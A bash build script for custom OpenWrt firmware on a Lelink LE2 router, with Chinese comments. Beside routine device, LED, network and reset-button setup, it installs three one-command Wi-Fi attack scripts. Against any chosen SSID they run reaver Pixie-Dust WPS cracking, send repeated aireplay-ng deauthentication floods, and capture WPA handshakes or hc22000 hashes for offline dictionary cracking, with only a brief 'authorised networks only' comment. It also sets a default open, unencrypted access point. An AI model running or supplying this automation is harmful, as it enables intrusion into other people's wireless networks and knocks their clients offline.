#!/bin/bash
# 连乐2 v5 终版：网口指示灯 + 长按复位恢复出厂 + 无线审计脚本(audit-air / audit-hcx)
# 基于 v4（已实机验证结构：交换机 0-4、LED 14/15/16、复位 17、SUPPORTED_DEVICES、iperf3）
set -e

WS="${GITHUB_WORKSPACE:-$(cd .. && pwd)}"
if [ -d "target/linux/ath79" ]; then
	SRC="$(pwd)"
else
	SRC="$WS/openwrt"
fi
[ -d "$SRC/target/linux/ath79" ] || { echo "!! 找不到源码树"; exit 1; }

# ---------- 1. 屏蔽旧 diy-part2.sh ----------
cat > "$WS/diy-part2.sh" << 'EOS'
#!/bin/bash
exit 0
EOS
chmod +x "$WS/diy-part2.sh"

# ---------- 2. .config ----------
CFG="$WS/.config"
add_cfg() { grep -q "^$1=y" "$CFG" 2>/dev/null || echo "$1=y" >> "$CFG"; }
add_cfg CONFIG_PACKAGE_luci
add_cfg CONFIG_PACKAGE_luci-base
add_cfg CONFIG_PACKAGE_luci-i18n-base-zh-cn
add_cfg CONFIG_PACKAGE_wpad-basic-mbedtls
add_cfg CONFIG_PACKAGE_kmod-ath9k
add_cfg CONFIG_PACKAGE_iw
add_cfg CONFIG_PACKAGE_bridge-utils
add_cfg CONFIG_PACKAGE_aircrack-ng
add_cfg CONFIG_PACKAGE_airmon-ng
add_cfg CONFIG_PACKAGE_hcxdumptool
add_cfg CONFIG_PACKAGE_hcxtools
add_cfg CONFIG_PACKAGE_reaver
add_cfg CONFIG_PACKAGE_pixiewps
add_cfg CONFIG_PACKAGE_tmux
add_cfg CONFIG_PACKAGE_nodogsplash
add_cfg CONFIG_PACKAGE_luci-app-commands
add_cfg CONFIG_PACKAGE_iperf3
sed -i '/CONFIG_PACKAGE_luci-network=y/d; /CONFIG_PACKAGE_luci-system=y/d' "$CFG" 2>/dev/null || true
echo "==> .config 已补包"

# ---------- 3. 设备定义 ----------
GMK="$SRC/target/linux/ath79/image/generic.mk"
if grep -q "^define Device/lelink_le2$" "$GMK"; then
	sed -i '/^define Device\/lelink_le2$/,/^TARGET_DEVICES += lelink_le2$/d' "$GMK"
fi
cat >> "$GMK" << 'EOF'

# 连乐2：沿用上游乐视 LBA-047-CH 的 DTS 与 OKLI 引导方案
define Device/lelink_le2
  $(Device/loader-okli-uimage)
  SOC := qca9531
  DEVICE_VENDOR := Lelink
  DEVICE_MODEL := LE2
  DEVICE_DTS := qca9531_letv_lba-047-ch
  SUPPORTED_DEVICES := letv,lba-047-ch lelink,le2
  DEVICE_PACKAGES := -uboot-envtools
  FACTORY_SIZE := 14528k
  IMAGE_SIZE := 15936k
  LOADER_FLASH_OFFS := 0x50000
  KERNEL := kernel-bin | append-dtb | lzma | uImage lzma -M 0x4f4b4c49
  IMAGES := sysupgrade.bin factory.bin kernel.bin rootfs.bin
  IMAGE/kernel.bin := append-loader-okli-uimage $(1) | pad-to 64k
  IMAGE/rootfs.bin := append-kernel | pad-to $$$$(BLOCKSIZE) | append-rootfs | pad-rootfs | check-size $$$$(FACTORY_SIZE)
  IMAGE/factory.bin := append-kernel | pad-to $$$$(BLOCKSIZE) | append-rootfs | pad-rootfs | pad-to 14876672 | append-loader-okli-uimage $(1)
endef
TARGET_DEVICES += lelink_le2
EOF
echo "==> 设备定义已写入"

# ---------- 4. DTS：LED 14/15/16 高有效 ----------
DTS="$SRC/target/linux/ath79/dts/qca9531_letv_lba-047-ch.dts"
[ -f "$DTS" ] || { echo "!! 找不到 DTS"; exit 1; }
python3 - "$DTS" << 'PY'
import subprocess,sys
p=sys.argv[1]; s=open(p).read()
s=s.replace('<&gpio 13 GPIO_ACTIVE_LOW>','<&gpio 14 GPIO_ACTIVE_HIGH>')
s=s.replace('<&gpio 4 GPIO_ACTIVE_LOW>','<&gpio 15 GPIO_ACTIVE_HIGH>')
s=s.replace('<&gpio 11 GPIO_ACTIVE_LOW>','<&gpio 16 GPIO_ACTIVE_HIGH>')
s=s.replace('label = "blue:status"','label = "green:signal1"')
s=s.replace('label = "green:status"','label = "green:signal2"')
s=s.replace('label = "red:status"','label = "green:signal3"')
open(p,'w').write(s)
print(subprocess.run(['grep','-n','gpios',p],capture_output=True,text=True).stdout)
PY
echo "==> DTS 已改"

# ---------- 5. 网络（两口都 LAN，中继形态） ----------
mkdir -p "$SRC/files/etc/uci-defaults"
cat > "$SRC/files/etc/uci-defaults/99-le2-net" << 'EOF'
#!/bin/sh
u() { uci -q "$@"; }
u delete network.wan
u delete network.wan6
while u delete network.@switch_vlan[0]; do :; done
while u delete network.@switch[0]; do :; done
for i in 9 8 7 6 5 4 3 2 1 0; do
	[ "$(u get network.@device[$i].name)" = "br-lan" ] && u delete network.@device[$i]
done
u add network device
u set network.@device[-1].name='br-lan'
u set network.@device[-1].type='bridge'
u add_list network.@device[-1].ports='eth0'
u add_list network.@device[-1].ports='eth1'
u add network switch
u set network.@switch[-1].name='switch0'
u set network.@switch[-1].reset='1'
u set network.@switch[-1].enable_vlan='1'
u add network switch_vlan
u set network.@switch_vlan[-1].device='switch0'
u set network.@switch_vlan[-1].vlan='1'
u set network.@switch_vlan[-1].ports='0 1 2 3 4'
u set network.lan='interface'
u set network.lan.device='br-lan'
u set network.lan.proto='static'
u set network.lan.ipaddr='192.168.1.1'
u set network.lan.netmask='255.255.255.0'
u set network.lan.ip6assign='60'
u commit network
exit 0
EOF
chmod +x "$SRC/files/etc/uci-defaults/99-le2-net"

# ---------- 6. WiFi / 时区 ----------
cat > "$SRC/files/etc/uci-defaults/99-le2-wifi" << 'EOF'
#!/bin/sh
[ -f /etc/config/wireless ] || wifi config >/dev/null 2>&1
if [ -f /etc/config/wireless ]; then
	uci -q set wireless.radio0.disabled='0' || true
	uci -q set wireless.@wifi-iface[0].disabled='0' || true
	uci -q set wireless.@wifi-iface[0].ssid='OpenWrt' || true
	uci -q set wireless.@wifi-iface[0].encryption='none' || true
	uci -q set wireless.@wifi-iface[0].network='lan' || true
	uci -q commit wireless
fi
exit 0
EOF
cat > "$SRC/files/etc/uci-defaults/99-le2-tz" << 'EOF'
#!/bin/sh
uci -q set system.@system[0].timezone='CST-8' || true
uci -q set system.@system[0].zonename='Asia/Shanghai' || true
uci -q set system.@system[0].ntp='1' || true
uci -q commit system
[ -x /etc/init.d/nodogsplash ] && /etc/init.d/nodogsplash disable 2>/dev/null
exit 0
EOF
chmod +x "$SRC/files/etc/uci-defaults/99-le2-wifi" "$SRC/files/etc/uci-defaults/99-le2-tz"

# ---------- 7. 复位键：短按重启 / 长按 5 秒恢复出厂 ----------
mkdir -p "$SRC/files/etc/rc.button"
cat > "$SRC/files/etc/rc.button/reset" << 'EOF'
#!/bin/sh
# 短按 -> 重启；按住 >=5 秒 -> 恢复出厂(firstboot)
FLAG=/tmp/le2-reset-hold
case "$ACTION" in
press|pressed)
	rm -f "$FLAG"
	echo pressed > "$FLAG"
	( sleep 5; [ -f "$FLAG" ] && echo hold > "$FLAG" ) &
	;;
timeout)
	echo hold > "$FLAG"
	logger -t le2-reset "长按 5 秒：恢复出厂"
	firstboot -y
	reboot
	;;
release|released)
	if [ "$(cat "$FLAG" 2>/dev/null)" = "hold" ]; then
		rm -f "$FLAG"
		logger -t le2-reset "长按：恢复出厂"
		firstboot -y
		reboot
	else
		rm -f "$FLAG"
		logger -t le2-reset "短按：重启"
		reboot
	fi
	;;
esac
EOF
chmod +x "$SRC/files/etc/rc.button/reset"

# ---------- 8. rc.local：网口指示灯 + 交换机兜底 + 诊断 ----------
cat > "$SRC/files/etc/rc.local" << 'EOF'
#!/bin/sh
for i in $(seq 1 20); do [ -d /sys/class/net/br-lan ] && break; sleep 1; done

swconfig dev switch0 set enable_vlan 1 2>/dev/null
swconfig dev switch0 vlan 1 set ports "0 1 2 3 4" 2>/dev/null

L=/sys/class/leds
if [ -d "$L/green:signal1" ]; then
	echo netdev > "$L/green:signal1/trigger" 2>/dev/null
	echo eth0 > "$L/green:signal1/device_name" 2>/dev/null
	echo 1 > "$L/green:signal1/link" 2>/dev/null
	echo 0 > "$L/green:signal1/tx" 2>/dev/null
	echo 0 > "$L/green:signal1/rx" 2>/dev/null
fi
if [ -d "$L/green:signal2" ]; then
	echo netdev > "$L/green:signal2/trigger" 2>/dev/null
	echo eth0 > "$L/green:signal2/device_name" 2>/dev/null
	echo 1 > "$L/green:signal2/tx" 2>/dev/null
	echo 1 > "$L/green:signal2/rx" 2>/dev/null
	echo 0 > "$L/green:signal2/link" 2>/dev/null
fi
if [ -d "$L/green:signal3" ]; then
	echo none > "$L/green:signal3/trigger" 2>/dev/null
	echo 0 > "$L/green:signal3/brightness" 2>/dev/null
fi

{ echo "=== swconfig ==="; swconfig dev switch0 show 2>&1;
  echo "=== brctl ==="; brctl show 2>&1;
  echo "=== speed ==="; cat /sys/class/net/eth0/speed /sys/class/net/eth1/speed 2>&1;
  echo "=== leds ==="; ls /sys/class/leds 2>&1;
  echo "=== network ==="; cat /etc/config/network 2>&1; } > /www/diag-net.txt 2>&1
exit 0
EOF
chmod +x "$SRC/files/etc/rc.local"

# ---------- 9. 审计脚本：audit-air ----------
mkdir -p "$SRC/files/usr/bin"
cat > "$SRC/files/usr/bin/audit-air" << 'EOF'
#!/bin/sh
# audit-air —— 连乐2(ath9k) 一键握手：仙尘首战 + airodump 抓包
# 用法：TAG=目标SSID audit-air     （可选 CH=6 W=60 PWT=60）
# 只用在自己/授权的网络。脚本会先关无线，请用有线 SSH 控制。
TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"
CH="${CH:-0}"; W="${W:-60}"; PWT="${PWT:-60}"
OUT=/www/audit; FIN=/root/audit-out
mkdir -p "$OUT" "$FIN"

for b in iw airodump-ng aireplay-ng aircrack-ng reaver; do
	command -v $b >/dev/null || { echo "ABORT10 缺 $b"; exit 10; }
done

PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
[ -n "$PHY" ] || { echo "ABORT13 找不到 phy"; exit 13; }
echo "[*] phy=$PHY 目标=$TAG"

wifi down 2>/dev/null; sleep 2
iw dev mon0 del 2>/dev/null
iw phy "$PHY" interface add mon0 type monitor || { echo "ABORT19 建 monitor 失败"; exit 19; }
ip link set mon0 up || { echo "ABORT19 拉起 mon0 失败"; exit 19; }

echo "[*] 扫描目标"
iw dev mon0 scan 2>/dev/null > "$OUT/scan.txt"
SSIDLINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
[ -n "$SSIDLINE" ] || { echo "ABORT16 扫不到 $TAG（换位置再试）"; iw dev mon0 del; wifi up; exit 16; }
BSS=$(sed -n "1,${SSIDLINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
FREQ=$(sed -n "${SSIDLINE},$((SSIDLINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
if [ "$CH" = "0" ]; then
	case ${FREQ:-2437} in
	2412) CH=1;; 2417) CH=2;; 2422) CH=3;; 2427) CH=4;; 2432) CH=5;;
	2437) CH=6;; 2442) CH=7;; 2447) CH=8;; 2452) CH=9;; 2457) CH=10;;
	2462) CH=11;; 2467) CH=12;; 2472) CH=13;; *) CH=6;;
	esac
fi
echo "[*] BSSID=$BSS 信道=$CH"
iw dev mon0 set channel "$CH" 2>/dev/null
killall wpa_supplicant hostapd 2>/dev/null

echo "[*] 仙尘首战（最多 ${PWT}s）"
timeout ${PWT}s reaver -i mon0 -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
if grep -qiE "WPS PIN|Password|key" "$OUT/pixie.log"; then
	echo "[+] 仙尘出结果："; grep -iE "WPS PIN|Password|key" "$OUT/pixie.log"
else
	echo "[-] 仙尘空，转抓包"
fi

BIN="$OUT/$TAG-$(date +%H%M%S)"
echo "[*] airodump 抓包 ${W}s，每 10s 踢一次人"
airodump-ng -c "$CH" --bssid "$BSS" -w "$BIN" mon0 > "$OUT/airodump.log" 2>&1 &
AID=$!
t=0
while [ $t -lt $W ]; do
	sleep 10; t=$((t+10))
	aireplay-ng -0 5 -a "$BSS" mon0 >/dev/null 2>&1
	CAP=$(ls "$BIN"-01.cap 2>/dev/null)
	if [ -n "$CAP" ] && aircrack-ng "$CAP" < /dev/null 2>&1 | grep -qE "WPA \([1-9]"; then
		echo "[+] 第 ${t}s 命中握手"; break
	fi
done
kill $AID 2>/dev/null; sleep 1
CAP=$(ls "$BIN"-01.cap 2>/dev/null)
if [ -n "$CAP" ]; then
	cp "$CAP" "$FIN/" 2>/dev/null
	echo "[*] 包：$CAP（已复制到 $FIN/）"
	aircrack-ng "$CAP" < /dev/null 2>&1 | grep -E "WPA|BSSID" | head -3
fi
iw dev mon0 del 2>/dev/null
wifi up 2>/dev/null
echo "[*] 结束，无线已恢复"
EOF
chmod +x "$SRC/files/usr/bin/audit-air"

# ---------- 10. 审计脚本：audit-hcx ----------
cat > "$SRC/files/usr/bin/audit-hcx" << 'EOF'
#!/bin/sh
# audit-hcx —— 连乐2(ath9k) 一键：仙尘首战 + hcxdumptool 抓包
# 用法：TAG=目标SSID audit-hcx     （可选 CH=6 W=60 PWT=60）
TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"
CH="${CH:-0}"; W="${W:-60}"; PWT="${PWT:-60}"
OUT=/www/audit; FIN=/root/audit-out
mkdir -p "$OUT" "$FIN"

for b in iw hcxdumptool hcxpcapngtool reaver; do
	command -v $b >/dev/null || { echo "ABORT10 缺 $b"; exit 10; }
done

PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
[ -n "$PHY" ] || { echo "ABORT13 找不到 phy"; exit 13; }
echo "[*] phy=$PHY 目标=$TAG"

wifi down 2>/dev/null; sleep 2
# hcxdumptool 要自己设 monitor，所以给它一个 managed 口；扫描也用它
iw dev mon0 del 2>/dev/null
iw dev hcx0 del 2>/dev/null
iw phy "$PHY" interface add hcx0 type managed || { echo "ABORT19 建 hcx0 失败"; exit 19; }
ip link set hcx0 up
iw dev hcx0 scan 2>/dev/null > "$OUT/scan.txt"
SSIDLINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
[ -n "$SSIDLINE" ] || { echo "ABORT16 扫不到 $TAG"; iw dev hcx0 del; wifi up; exit 16; }
BSS=$(sed -n "1,${SSIDLINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
FREQ=$(sed -n "${SSIDLINE},$((SSIDLINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
if [ "$CH" = "0" ]; then
	case ${FREQ:-2437} in
	2412) CH=1;; 2437) CH=6;; 2462) CH=11;; *) CH=6;;
	esac
fi
echo "[*] BSSID=$BSS 信道=$CH"
killall wpa_supplicant hostapd 2>/dev/null

echo "[*] 仙尘首战（临时 monitor 口，最多 ${PWT}s）"
iw phy "$PHY" interface add monpwt type monitor 2>/dev/null
ip link set monpwt up 2>/dev/null
iw dev monpwt set channel "$CH" 2>/dev/null
timeout ${PWT}s reaver -i monpwt -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
iw dev monpwt del 2>/dev/null
if grep -qiE "WPS PIN|Password" "$OUT/pixie.log"; then
	echo "[+] 仙尘出结果："; grep -iE "WPS PIN|Password" "$OUT/pixie.log"
fi

BIN="$OUT/$TAG-$(date +%H%M%S).pcapng"
echo "[*] hcxdumptool 抓包 ${W}s（三向量）"
hcxdumptool -i hcx0 -w "$BIN" -c "$CH" --rds=2 > "$OUT/hcx.log" 2>&1 &
HID=$!
t=0
while [ $t -lt $W ]; do
	sleep 5; t=$((t+5))
	[ -f "$BIN" ] || continue
	hcxpcapngtool -o "$OUT/live.hc22000" "$BIN" >/dev/null 2>&1
	if grep -qai "$(echo $BSS | tr -d ':')" "$OUT/live.hc22000" 2>/dev/null; then
		echo "[+] 第 ${t}s 命中记录"; break
	fi
done
kill $HID 2>/dev/null; sleep 1
hcxpcapngtool -o "$FIN/$TAG.hc22000" "$BIN" >/dev/null 2>&1
echo "[*] 记录：$FIN/$TAG.hc22000"
iw dev hcx0 del 2>/dev/null
wifi up 2>/dev/null
echo "[*] 结束，无线已恢复"
EOF
chmod +x "$SRC/files/usr/bin/audit-hcx"

# ---------- 11. 自检 ----------
echo "---- 设备定义 ----"; grep -A 16 'define Device/lelink_le2' "$GMK"
echo "---- DTS LED ----"; grep -n "gpios = <&gpio" "$DTS"
echo "---- 脚本 ----"; ls -l "$SRC/files/usr/bin/" "$SRC/files/etc/rc.button/"
echo "---- 审计脚本语法 ----"
for f in "$SRC/files/usr/bin/audit-air" "$SRC/files/usr/bin/audit-hcx" "$SRC/files/etc/rc.button/reset" "$SRC/files/etc/rc.local"; do
	if sh -n "$f"; then echo "ok $(basename $f)"; else echo "!! 语法错误 $(basename $f)"; fi
done
echo "==> 完成"
# ---------- 10. 一条龙审计：audit（只给 SSID） ----------
cat > "$SRC/files/usr/bin/audit" << 'AUDIT_EOF'
#!/bin/sh
# audit —— 连乐2 审计一条龙：只给目标 SSID，其余全自动
# 用法：audit 目标SSID [抓包秒数]
#   例：audit CU_r2CU
#       audit CU_r2CU 180
# 流程：关无线 → 建 monitor → 扫目标 → 仙尘(WPS) → 诱发握手+抓包 → 校验握手 → 生成网页报告 → 恢复无线
# 仅用于自己/已授权的网络。

TAG="$1"
W="${2:-120}"
PWT="${PWT:-60}"
OUT=/www/audit
FIN=/root/audit-out
mkdir -p "$OUT" "$FIN"
rm -f "$OUT"/cap-*.cap "$OUT"/*.log >/dev/null 2>&1

say() { echo "[*] $*"; }
die() { echo "ABORT$1 $2"; finish; exit "$1"; }

finish() {
	[ -n "$MON" ] && { iw dev "$MON" del >/dev/null 2>&1; MON=""; }
	[ -n "$AID" ] && kill "$AID" >/dev/null 2>&1
	wifi up >/dev/null 2>&1
	{ echo "=== 报告 ==="
	  echo "目标: ${TAG:-未提供}"
	  echo "时间: $(date '+%Y-%m-%d %H:%M:%S')"
	  echo "BSSID: ${BSS:-未锁定}  信道: ${CH:-?}"
	  echo "仙尘: ${PIXIE_RESULT:-未执行}"
	  echo "握手: ${HS_RESULT:-未执行}"
	  [ -n "$CAPFILE" ] && echo "抓包: $(basename "$CAPFILE")"
	} > "$OUT/summary.txt"
	{
	  echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">'
	  echo '<title>连乐2 审计报告</title><style>body{margin:0;padding:12px;background:#0f1216;color:#dfe7ef;font:13px/1.6 monospace}h1{color:#6ad}h2{color:#fc6;border-bottom:1px solid #333;padding-top:14px}pre{white-space:pre-wrap;word-break:break-all;background:#151a20;padding:8px;border-radius:6px}</style></head><body>'
	  echo "<h1>连乐2 审计报告</h1><h2>结论</h2><pre>$(cat "$OUT/summary.txt" 2>/dev/null)</pre>"
	  for f in pixie.log airodump.log aircrack.log; do
		[ -f "$OUT/$f" ] && echo "<h2>$f</h2><pre>$(sed -e 's/&/\&amp;/g' -e 's/</\&lt;/g' -e 's/>/\&gt;/g' "$OUT/$f" | tail -n 40)</pre>"
	  done
	  echo "<h2>可下载</h2><p><a style='color:#6ad' href='/audit/'>/audit/</a> 目录里有 cap 文件</p>"
	  echo '</body></html>'
	} > "$OUT/index.html"
}

# ---------- 前置检查 ----------
[ -n "$TAG" ] || { echo "用法: audit <目标SSID> [秒数]"; echo "例: audit CU_r2CU"; exit 1; }
for b in iw airodump-ng aireplay-ng aircrack-ng reaver; do
	command -v "$b" >/dev/null 2>&1 || die 10 "缺 $b（固件没带这个工具）"
done
PHY=$(iw phy 2>/dev/null | awk '/^Wiphy phy/{print $2; exit}')
[ -n "$PHY" ] || die 13 "找不到无线 phy（ath9k 没起来）"
say "目标=$TAG  phy=$PHY  抓包=${W}s"

# ---------- 建 monitor ----------
wifi down >/dev/null 2>&1; sleep 2
iw dev mon0 del >/dev/null 2>&1
MON=mon0
iw phy "$PHY" interface add "$MON" type monitor >/dev/null 2>&1 || die 19 "monitor 建不起来"
ip link set "$MON" up >/dev/null 2>&1 || die 19 "monitor 拉不起来"
say "monitor 就绪"

# ---------- 扫目标 ----------
say "扫描中（约 10 秒）…"
iw dev "$MON" scan > "$OUT/scan.txt" 2>/dev/null
LINE=$(grep -n "SSID: $TAG$" "$OUT/scan.txt" | head -1 | cut -d: -f1)
[ -n "$LINE" ] || die 16 "扫不到 $TAG，换位置或确认真名"
BSS=$(sed -n "1,${LINE}p" "$OUT/scan.txt" | grep -oE "BSS [0-9a-f:]{17}" | tail -1 | awk '{print $2}')
FREQ=$(sed -n "${LINE},$((LINE+25))p" "$OUT/scan.txt" | grep -oE "freq: [0-9]+" | head -1 | awk '{print $2}')
case ${FREQ:-2437} in
	2412) CH=1;; 2417) CH=2;; 2422) CH=3;; 2427) CH=4;; 2432) CH=5;;
	2437) CH=6;; 2442) CH=7;; 2447) CH=8;; 2452) CH=9;; 2457) CH=10;;
	2462) CH=11;; 2467) CH=12;; 2472) CH=13;; *) CH=6;;
esac
[ -n "$BSS" ] || die 16 "扫到了 $TAG 但没解析出 BSSID"
say "锁定 BSSID=$BSS 信道=$CH"
iw dev "$MON" set channel "$CH" >/dev/null 2>&1

# ---------- 第一步：仙尘 ----------
say "仙尘尝试（最多 ${PWT}s）…"
timeout "$PWT" reaver -i "$MON" -b "$BSS" -K 1 -N -vv > "$OUT/pixie.log" 2>&1
if grep -qiE "PIN: |WPS PIN|PASSWORD|passphrase" "$OUT/pixie.log"; then
	PIXIE_RESULT="成功（见 pixie.log）"
elif grep -qiE "WPS" "$OUT/pixie.log"; then
	PIXIE_RESULT="目标开了 WPS 但本轮没出（可加大 PWT 重试）"
else
	PIXIE_RESULT="目标未开 WPS 或无响应"
fi
say "仙尘：$PIXIE_RESULT"

# ---------- 第二步：诱发握手 + 抓包 ----------
say "抓取握手（${W}s，含 deauth 诱发）…"
airodump-ng --bssid "$BSS" --channel "$CH" -w "$OUT/cap" "$MON" > "$OUT/airodump.log" 2>&1 &
AID=$!
i=0
while [ "$i" -lt 3 ]; do
	sleep 6
	aireplay-ng --deauth 4 -a "$BSS" -i "$MON" >/dev/null 2>&1
	i=$((i+1))
done
sleep $((W > 18 ? W - 18 : 0))
kill "$AID" >/dev/null 2>&1; AID=""; sleep 1
CAPFILE=$(ls -t "$OUT"/cap-*.cap 2>/dev/null | head -1)
[ -n "$CAPFILE" ] || die 20 "没抓到任何包"
HS_RESULT=$(aircrack-ng "$CAPFILE" 2>&1 | grep -E "WPA \([1-9]" | head -1)
if [ -n "$HS_RESULT" ]; then
	HS_RESULT="已抓到握手 → $HS_RESULT（拿去跑字典即可）"
else
	HS_RESULT="未抓到握手（目标当时无客户端关联，或距离太远）"
fi
aircrack-ng "$CAPFILE" > "$OUT/aircrack.log" 2>&1
say "握手：$HS_RESULT"

# 复制成品到持久目录
cp -f "$OUT"/cap-*.cap "$FIN"/ 2>/dev/null
cp -f "$OUT"/scan.txt "$FIN"/ 2>/dev/null

finish
say "完成。报告：http://192.168.2.1/audit/"
say "抓包文件也在 /root/audit-out/"
AUDIT_EOF
chmod +x "$SRC/files/usr/bin/audit"

# audit-air / audit-hcx 也支持直接跟 SSID
for f in audit-air audit-hcx; do
	[ -f "$SRC/files/usr/bin/$f" ] && sed -i 's|TAG="${TAG:?ABORT01 需要 TAG=目标SSID}"|TAG="${1:-$TAG}"; [ -n "$TAG" ] || { echo "ABORT01 用法: '$f' <SSID>"; exit 1; }|' "$SRC/files/usr/bin/$f"
done
